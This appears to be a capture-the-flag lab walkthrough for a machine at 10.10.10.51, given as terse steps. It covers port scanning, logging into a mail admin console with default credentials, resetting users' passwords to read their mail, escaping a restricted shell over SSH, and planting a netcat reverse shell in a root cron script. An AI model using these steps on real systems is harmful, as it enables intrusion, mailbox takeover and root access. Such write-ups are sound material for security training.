1. Nmap all ports and place them in a list to run thorough nmap scan.
	cat full-results.nmap | grep -oP '\d{1,5}/tcp' | sed 's/\/tcp/,/' | tr -d '\n' | sed 's/,$//' > ports.txt
	nmap -p 22,25,80,110,119,4555 -sV -sC -oA final-scan --script vuln 10.10.10.51

2. We explore port 4555 with nc, we are then prompted to enter a username and password, all of which are 
   "root:root" to create a brute forces check for other videos of him using pwn tools and bufferoverflows.
   Or use python and expect to create a brute forcer.
   
3. Next step looking at the HELP menu we find a way to list users, we edit the mailadmin password to 
   password, and next use thunderbird to use the account and setting the right smtp ports.

	listusers
	Existing accounts 5
	user: james
	user: thomas
	user: john
	user: mindy
	user: mailadmin

   We try to setup the mailadmin user but we do not see any messages for which we now focus on the mindy
   user and change her password to password. 

   Note: the user is set to mindy and email mindy@10.10.10.51 with password "password", we then get two 
   messages
   
   One containing a password for ssh access

	username: mindy
	pass: P@55W0rd1!2@

4. Upon logging in we are presented with a restricted bash shell, to bypass this measure you can use the 
   following command while sshing:
	ssh mindy@10.10.10.51 -t "bash --noprofile"

5. After escaping the shell, we run our enumeration scripts. We use LinEnum.sh with the "-t" option set
   After performing the enumeration we find a file owned by root that is world writeable "/opt/tmp.py"

6. Next step is to get a reverse shell by leveraging the file. There is apparently a cron job running 
   every three minutes by root that executes that "tmp.py" file. To leverage it, the following to the files
   contents to get a reverse shell.

	#!/usr/bin/env python
	import os
	import sys
	try:
		os.system('nc 10.10.14.36 1234 -e /bin/bash ')
	except:
		sys.exit()

7. We setup and just wait for the shell.
